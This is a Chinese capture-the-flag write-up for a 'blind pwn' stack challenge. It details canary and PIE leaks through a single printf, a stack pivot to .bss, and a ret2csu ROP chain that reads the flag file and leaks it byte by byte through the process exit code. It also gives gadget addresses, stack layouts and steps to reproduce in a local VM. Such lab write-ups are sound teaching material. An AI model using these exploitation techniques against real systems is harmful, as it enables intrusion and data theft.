# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [att/cons_oracle.py](att/cons_oracle.py)
- [att/cons_selfcheck.py](att/cons_selfcheck.py)
- [att/exp_cmp.py](att/exp_cmp.py)
- [att/exp_cons.py](att/exp_cons.py)
- [att/exp_cons_search.py](att/exp_cons_search.py)
- [att/exploit.py](att/exploit.py)
- [att/ld-linux-x86-64.so.2](att/ld-linux-x86-64.so.2)
- [att/leak2.py](att/leak2.py)
- [att/leak3.py](att/leak3.py)
- [att/libc.so.6](att/libc.so.6)
- [att/pwn](att/pwn)
- [att/serve.py](att/serve.py)
- [att/wrapper](att/wrapper)
- [blind_pwn.md](blind_pwn.md)
- [blind_pwn_remote.md](blind_pwn_remote.md)
- [exp_blind.py](exp_blind.py)
- [exp_blind_remote.py](exp_blind_remote.py)

## 已有分析

- [blind_pwn.md](blind_pwn.md)
- [blind_pwn_remote.md](blind_pwn_remote.md)

### blind pwn —— `pwn`（PIE + canary + seccomp，只有 read/exit）

#### 0. 跑出来的结果

本机 VM（UTM / Ubuntu 22.04 x86_64）里，用附件自带的 `ld-linux-x86-64.so.2` + `libc.so.6` 跑：

```
flag 文件内容: flag{blind_pwn_1s_r34lly_bl1nd}
$ python3 exploit.py
[+] flag[00] = 0x66  -> b'f'
...
[+] flag[29] = 0x7d  -> b'flag{blind_pwn_1s_r34lly_bl1nd}'
FLAG = flag{blind_pwn_1s_r34lly_bl1nd}
```

30 条连接，每字节一条，全部从 **进程退出码** 里拿回来。

#### 1. 程序在干什么

```
main:
  init();                       // setvbuf(stdin/stdout/stderr, _IONBF)
  open_flag();                  // open("flag", O_RDONLY) -> fd 3   ← flag 常驻 fd 3
  puts("Please input your name size: ");
  size = getnum();              // atoi(read(0, buf, 15))
  if (size > 0x88) exit(-1);
  printf("Please input your name:\n> ");
  get_input(buf /* rbp-0x60 */, size);
  printf("Your name is: %s\n", buf);        // ★ 唯一一次输出
  puts("Now you have 1 choice to change your name.");
  get_input(buf, size);                     // ★ 同一个 size
  sleep(1);
  blind();                                  // close(1); close(2); seccomp
  printf("there is no output right?");
```

`blind()` 里的 seccomp：默认动作 `SCMP_ACT_ERRNO(1)`，只放行 **read(0)、exit(60)、exit_group(231)**。

⇒ blind 之后 `write` 全部 EPERM，fd 1/2 也已经 close，**没有任何输出手段**。
⇒ 唯一的信息通道 = 进程退出码；而 flag 就是 fd 3，`read` 恰好被放行 —— 设计意图非常明确。

#### 2. 漏洞与可写空间

`get_input(dest, size)` 逐字节 `read(0, &c, 1)` 写进 `dest[i]`，`i < size` 才停（`\n` 也停）。
`main` 里 `buf = rbp-0x60`，`canary = rbp-0x8`，`saved rbp = [rbp]`，`ret = [rbp+8]`。

`size ≤ 0x88` ⇒ 能写到的最后一个字节是 `rbp+0x27`，
返回地址之后 **只有 4 个 qword**（`ret` + 3 个参数槽）：

```
rbp-0x60  ┌──────────────┐  buf[0..0x57]
rbp-0x08  │   canary     │
rbp+0x00  │   saved rbp  │  ← 源码里 `mov [rbp], rcx`
rbp+0x08  │   ret        │
rbp+0x10  │   q1         │
rbp+0x18  │   q2         │
rbp+0x20  │   q3         │
rbp+0x28  │  (&main)     │  ← __libc_start_main 栈帧，写不到
```

#### 3. 一次 printf 同时泄露 canary + PIE 基址（关键点）

第一次输入给 `0x58` 个 `'A'` + 1 个非 0 字节（例如 `'X'`）：

* `'X'` 只盖住 canary 的**最低字节**（glibc 的 canary 最低字节本来就是 `0x00`），
  于是 `%s` 越过 canary 继续打印 **canary 的高 7 字节**；
* canary 之后就是 `main` 的 saved rbp。而进 `main` 时 `rcx` 还留着
  `__libc_start_main` 传进来的 `init` 指针，也就是 **`&__libc_csu_init`**：

```
0x58 个 'A' | canary[1..7] (7B) | &__libc_csu_init (6B) | 0x00 0x00 → 字符串在这停
```

实测（VM）：

```
... A A A X | 12 d8 4d 5c 3a 54 1d | a0 05 a0 e1 f4 77
canary = 00 12 d8 4d 5c 3a 54 1d
PIE    = 0x77f4e1a005a0 - 0x2005a0 = 0x77f4e1800000
```

一次 `printf` 就同时拿到 **canary 与 PIE 基址**，不需要第二次泄露
（指针高两字节是 0，字符串必然在这里结束，所以"要么拿 canary 要么拿 libc"的取舍并不存在）。

#### 4. 第一段链：4 个 qword 把执行流搬到 .bss

```
ret = pop rdi ; ret        0x200603
q1  = stage2               0x601200 + PIE      ← .bss 里可写页 0x601000-0x602000
q2  = get_input            0x20031c            get_input(dest, size)
q3  = leave ; ret          0x20059d
saved rbp = stage2                            ← 给 leave 用
```

`get_input` 的第二个参数取自 `rsi`，而此时 `rsi = 0x7fffffffc330`（printf 留下的栈地址），
`esi = 0xc330` 足够大 ⇒ `get_input(.bss, 0xc330)` 会把我们随后发的一行（直到 `\n`）写进 `.bss`。
它返回后落到 `leave; ret`：`rsp = rbp = stage2`，于是开始在 `.bss` 里跑第二段链。

#### 5. 第二段链：ret2csu 读 flag，退出码外带

```
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret   0x2005fa
mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call [r12+rbx*8] 0x2005e0
```

注意 0x2005e0 这条 call 链：`call` 返回后还会 `add rbx,1; cmp rbp,rbx; jne 0x2005e0`，
所以要让 `rbp = rbx + 1 = 1` 才会往下走 `add rsp,8; pop ×6; ret`。

每次 `read(fd, dst, n)` 用一块（15 个 qword）：

```
CSU_POP | rbx=0 | rbp=1 | r12=&read@got(0x600fa8) | r13=3 | r14=dst | r15=n
CSU_CALL | (add rsp,8 跳过 1 个) | 6 个填充
```

第二段整体：

```
read(3, scratch, idx)   # 丢掉前 idx 字节          (idx==0x0a 时拆成 5+5)
read(3, dst,     1)     # 第 idx 个字节只改 dst 的最低字节
pop rdi ; ret           # rdi = *(dst) = flag[idx]
exit@plt                # 退出码 = flag[idx]
```

`dst` 就放在 `pop rdi` 后面那个槽位（先在数据里写 0），
`read(3, dst, 1)` 只改最低字节，于是 `pop rdi` 拿到的正好是 `0x00...00 || flag[idx]`。

每字节一条连接，把 `i` 换成 0,1,2,... 就能把 flag 读全（遇到 `}` / `\n` / `0x00` 停）。

#### 6. 踩过的坑

| 现象 | 原因 | 处理 |
|---|---|---|
| 第二次输入截断、正常 exit(0) | `getnum` 的 size 是**十进制**，题目上限是 `0x88 = 136`，写成 `89` 就只有 89 字节 | 发 `136\n` |
| 第一条输入发完程序卡住 | size=136 时 `get_input` 要读满 136 或遇 `\n`；泄露只用 89 字节 | 泄露输入后面补 `\n` |
| 程序读走名字的一部分 | `getnum` 一次 `read(0,buf,15)` 会把后面的名字吞掉 | 先送 size，等 `> ` 提示再送名字 |
| 偶发失败 | payload 里出现 `0x0a` 会被 `get_input` 截断（canary 字节、地址字节随机出现） | 检查到 `0x0a` 就重连 |
| `idx = 10` 必失败 | `p64(10)` 里就是 `0x0a` | 拆成 `read(,5)+read(,5)` |
| 泄露长度不够 | canary 某个字节或指针字节是 `0x00`（约 3%） | 重连重试 |

#### 7. 怎么在 VM 里复现

```bash
### 目标机（UTM Linux x86_64）：
mkdir -p ~/blind && cd ~/blind
### 放入 pwn、ld-linux-x86-64.so.2、libc.so.6
chmod +x pwn ld-linux-x86-64.so.2
echo 'flag{blind_pwn_1s_r34lly_bl1nd}' > flag

python3 exploit.py            # 逐字节打印 flag
MAXLEN=60 python3 exploit.py  # 限制长度
```

`exploit.py` 用 `process(["./ld-linux-x86-64.so.2","--library-path",".","./pwn"])` 起题，
用 `p.returncode` 读退出码；换远程平台时把 `start()` 改成 `remote(host, port)`，
前提是平台的 harness 能看到/回显子进程退出码（这道题在 blind 之后只剩 read/exit，
除此之外没有别的信道；附件里的 `wrapper` 只转发 stdin，看不到退出码）。


# EXP

- [att/cons_oracle.py](att/cons_oracle.py)
- [att/cons_selfcheck.py](att/cons_selfcheck.py)
- [att/exp_cmp.py](att/exp_cmp.py)
- [att/exp_cons.py](att/exp_cons.py)
- [att/exp_cons_search.py](att/exp_cons_search.py)
- [att/exploit.py](att/exploit.py)
- [att/leak2.py](att/leak2.py)
- [att/leak3.py](att/leak3.py)
- [att/serve.py](att/serve.py)
- [exp_blind.py](exp_blind.py)
- [exp_blind_remote.py](exp_blind_remote.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。
